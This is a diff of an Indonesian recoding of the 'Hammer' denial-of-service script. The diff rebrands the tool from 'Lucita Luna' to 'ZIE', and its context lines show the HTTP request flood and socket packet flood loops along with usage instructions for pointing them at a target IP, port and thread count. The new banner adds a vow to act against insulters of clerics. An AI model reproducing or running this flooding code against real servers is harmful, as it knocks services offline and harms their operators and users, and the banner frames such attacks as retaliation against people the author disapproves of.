@@ -1,16 +1,20 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
-#///////////////////////////////////////////////////////////////////////////////
-#///////////////////////////////////////////////////////////////////////////////
-#////                       _            _  __                              ////
-#////                      | |          (_)/ _|                             ////
-#////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
-#////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
-#////                   / /| | |_| | (__| | ||  __/ |                       ////
-#////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
-#////                                                                       ////
-#///////////////////////////////////////////////////////////////////////////////
-#///////////////////////////////////////////////////////////////////////////////
+#////////////////////////////////////////////////////////////////////////////
+#////////////////////////////////////////////////////////////////////////////
+#////     ____             _    __  __                     _             ////
+#////    |  _ \  __ _ _ __| | _|  \/  | ___ _ __  _ __    / \            ////
+#////    | | | |/ _` | '__| |/ / |\/| |/ _ \ '_ \| '_ \  / _ \           ////
+#////    | |_| | (_| | |  |   <| |  | |  __/ | | | | | |/ ___ \          ////
+#////    |____/ \__,_|_|  |_|\_\_|  |_|\___|_| |_|_| |_/_/   \_\         ////
+#////                                                                    ////
+#////                                                                    ////
+#////                                                                    ////
+#////                                                                    ////
+#////                                                                    ////
+#////                                                                    ////
+#////////////////////////////////////////////////////////////////////////////
+#////////////////////////////////////////////////////////////////////////////
 # Script ini recode dari 
 # python 3.3.2+ Hammer Dos Script v.1
 # by Can Yalçın
@@ -45,7 +49,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mLucita luna mengelus target...\033[0m")
+			print("\033[94mZIE mengelus target...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -59,13 +63,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Lucita Luna memukul target!--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--ZIE memukul target!--> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mBerhenti<->ah\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mServer tumbang! Lucita luna berhasil\033[0m")
+		print("\033[91mServer tumbang! ZIE berhasil\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -86,12 +90,14 @@ def dos2():
 
 def usage():
 	print (''' \033[92m	
-	╦  ┬ ┬┌─┐┬┌┬┐┌─┐  ╔╦╗╔╦╗┌─┐╔═╗
-	║  │ ││  │ │ ├─┤   ║║ ║║│ │╚═╗
-	╩═╝└─┘└─┘┴ ┴ ┴ ┴  ═╩╝═╩╝└─┘╚═╝
-	Pukulan Lucita Luna Dos Script v.1
-	Pembuat tidak bertanggung jawab jika digunakan untuk melawan hukum.
-	Pembuat tidak bertanggung jawab jika Lucita Luna hamil :).
+	________ _____   ____  ____   ___  ____ 
+        |__  /_ _| ____| |  _ \|  _ \ / _ \/ ___|
+          / / | ||  _|   | | | | | | | | | \___ \
+         / /_ | || |___  | |_| | |_| | |_| |___) |
+        /____|___|_____| |____/|____/ \___/|____/
+	Pukulan ZIE Doos Script v.1.
+        ZIE tidak akan tinggal diam jika ada Penista atau penghina ulama!!! 
+
 	Script ini recode ke bahasa indonesia dari script Hammer v.1 \n
 	cara pakai : python3 pukul.py [-s] [-p] [-t]
 	contoh : python3 pukul.py -s 192.168.0.1 -p 80 -t 135	
@@ -146,7 +152,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mLucita luna melakukan Pengecekan...\033[0m")
+	print("\033[94mZIE melakukan Pengecekan...\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
